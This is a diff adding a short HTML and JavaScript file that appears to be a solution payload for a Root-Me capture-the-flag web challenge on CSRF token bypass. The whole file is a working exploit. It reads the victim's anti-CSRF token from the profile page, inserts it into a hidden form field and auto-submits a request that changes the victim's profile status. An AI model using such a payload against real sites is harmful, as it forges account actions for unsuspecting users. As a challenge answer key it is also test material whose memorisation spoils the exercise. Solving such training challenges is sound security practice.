@@ -1,0 +1,20 @@
+<form id="f" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="POST" name="f">
+	<input id="username" type="text" name="username" value="test">
+	<input id="status" type="checkbox" name="status" checked>
+	<input id="token" type="hidden" name="token" value="cbe80cb5131d9711b1c477968563efd8">
+	<button type="submit">Submit</button>
+</form>
+
+<script>
+var http = new XMLHttpRequest();
+var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
+
+http.open('GET', url, false);
+http.send();
+
+var admintoken = "";
+admintoken = http.responseText.match(/[abcdef0123456789]{32}/);
+
+document.getElementById("token").setAttribute('value', admintoken);
+document.f.submit();
+</script>
